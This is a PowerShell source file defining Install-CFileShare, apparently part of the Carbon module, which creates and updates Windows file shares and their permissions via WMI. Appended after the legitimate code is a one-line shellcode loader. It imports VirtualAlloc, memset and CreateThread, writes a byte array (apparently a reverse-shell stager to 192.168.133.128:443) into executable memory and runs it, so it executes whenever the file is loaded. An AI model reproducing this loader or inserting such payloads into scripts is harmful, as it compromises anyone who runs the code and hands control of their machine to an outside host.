
function Install-CFileShare
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $Name,
        
        [Parameter(Mandatory=$true)]
        [string]
        
        $Path,
            
        [string]
        
        $Description = '',
        
        [string[]]
        
        $FullAccess = @(),
        
        [string[]]
        
        $ChangeAccess = @(),
        
        [string[]]
        
        $ReadAccess = @(),

        [Switch]
        
        
        
        $Force
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    function New-ShareAce
    {
        param(
            [Parameter(Mandatory=$true)]
            [AllowEmptyCollection()]
            [string[]]
            
            $Identity,

            [Carbon.Security.ShareRights]
            
            $ShareRight
        )

        Set-StrictMode -Version 'Latest'

        foreach( $identityName in $Identity )
        {
            $trustee = ([wmiclass]'Win32_Trustee').CreateInstance()
            [Security.Principal.SecurityIdentifier]$sid = Resolve-CIdentity -Name $identityName | Select-Object -ExpandProperty 'Sid'
            if( -not $sid )
            {
                continue
            }

            $sidBytes = New-Object 'byte[]' $sid.BinaryLength
            $sid.GetBinaryForm( $sidBytes, 0)

            $trustee.Sid = $sidBytes

            $ace = ([wmiclass]'Win32_Ace').CreateInstance()
            $ace.AccessMask = $ShareRight
            $ace.AceFlags = 0
            $ace.AceType = 0
            $ace.Trustee = $trustee

            $ace
        }
    }

    $errors = @{
                [uint32]2 = 'Access Denied';
                [uint32]8 = 'Unknown Failure';
                [uint32]9 = 'Invalid Name';
                [uint32]10 = 'Invalid Level';
                [uint32]21 = 'Invalid Parameter';
                [uint32]22 = 'Duplicate Share';
                [uint32]23 = 'Restricted Path';
                [uint32]24 = 'Unknown Device or Directory';
                [uint32]25 = 'Net Name Not Found';
            }

    $Path = Resolve-CFullPath -Path $Path
    $Path = $Path.Trim('\\')
    
    if( $Path -eq (Split-Path -Qualifier -Path $Path ) )
    {
        $Path = Join-Path -Path $Path -ChildPath '\'
    }

    if( (Test-CFileShare -Name $Name) )
    {
        $share = Get-CFileShare -Name $Name
        [bool]$delete = $false
        
        if( $Force )
        {
            $delete = $true
        }

        if( $share.Path -ne $Path )
        {
            Write-Verbose -Message ('[SHARE] [{0}] Path         {1} -> {2}.' -f $Name,$share.Path,$Path)
            $delete = $true
        }

        if( $delete )
        {
            Uninstall-CFileShare -Name $Name
        }
    }

    $shareAces = Invoke-Command -ScriptBlock {
                                                New-ShareAce -Identity $FullAccess -ShareRight FullControl
                                                New-ShareAce -Identity $ChangeAccess -ShareRight Change
                                                New-ShareAce -Identity $ReadAccess -ShareRight Read
                                           }
    if( -not $shareAces )
    {
        $shareAces = New-ShareAce -Identity 'Everyone' -ShareRight Read
    }

    
    $shareSecurityDescriptor = ([wmiclass] "Win32_SecurityDescriptor").CreateInstance() 
    $shareSecurityDescriptor.DACL = $shareAces
    $shareSecurityDescriptor.ControlFlags = "0x4"

    if( -not (Test-CFileShare -Name $Name) )
    {
        if( -not (Test-Path -Path $Path -PathType Container) )
        {
            New-Item -Path $Path -ItemType Directory -Force | Out-String | Write-Verbose
        }
    
        $shareClass = Get-WmiObject -Class 'Win32_Share' -List
        Write-Verbose -Message ('[SHARE] [{0}]              Sharing {1}' -f $Name,$Path)
        $result = $shareClass.Create( $Path, $Name, 0, $null, $Description, $null, $shareSecurityDescriptor )
        if( $result.ReturnValue )
        {
            Write-Error ('Failed to create share ''{0}'' (Path: {1}). WMI returned error code {2} which means: {3}.' -f $Name,$Path,$result.ReturnValue,$errors[$result.ReturnValue])
            return
        }
    }
    else
    {
        $share = Get-CFileShare -Name $Name
        $updateShare = $false
        if( $share.Description -ne $Description )
        {
            Write-Verbose -Message ('[SHARE] [{0}] Description  {1} -> {2}' -f $Name,$share.Description,$Description)
            $updateShare = $true
        }

        
        foreach( $ace in $shareAces )
        {
            $identityName = Resolve-CIdentityName -SID $ace.Trustee.SID
            $permission = Get-CFileSharePermission -Name $Name -Identity $identityName

            if( -not $permission )
            {
                Write-Verbose -Message ('[SHARE] [{0}] Access       {1}:  -> {2}' -f $Name,$identityName,([Carbon.Security.ShareRights]$ace.AccessMask))
                $updateShare = $true
            }
            elseif( [int]$permission.ShareRights -ne $ace.AccessMask )
            {
                Write-Verbose -Message ('[SHARE] [{0}] Access       {1}: {2} -> {3}' -f $Name,$identityName,$permission.ShareRights,([Carbon.Security.ShareRights]$ace.AccessMask))
                $updateShare = $true
            }
        }

        
        $existingAces = Get-CFileSharePermission -Name $Name
        foreach( $ace in $existingAces )
        {
            $identityName = $ace.IdentityReference.Value

            $existingAce = $ace
            if( $shareAces )
            {
                $existingAce = $shareAces | Where-Object { 
                                                        $newIdentityName = Resolve-CIdentityName -SID $_.Trustee.SID
                                                        return ( $newIdentityName -eq $ace.IdentityReference.Value )
                                                    }
            }

            if( -not $existingAce )
            {
                Write-Verbose -Message ('[SHARE] [{0}] Access       {1}: {2} ->' -f $Name,$identityName,$ace.ShareRights)
                $updateShare = $true
            }
        }

        if( $updateShare )
        {
            $result = $share.SetShareInfo( $share.MaximumAllowed, $Description, $shareSecurityDescriptor )
            if( $result.ReturnValue )
            {
                Write-Error ('Failed to create share ''{0}'' (Path: {1}). WMI returned error code {2} which means: {3}' -f $Name,$Path,$result.ReturnValue,$errors[$result.ReturnValue])
                return
            }
        }
    }
}

Set-Alias -Name 'Install-SmbShare' -Value 'Install-CFileShare'

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x85,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

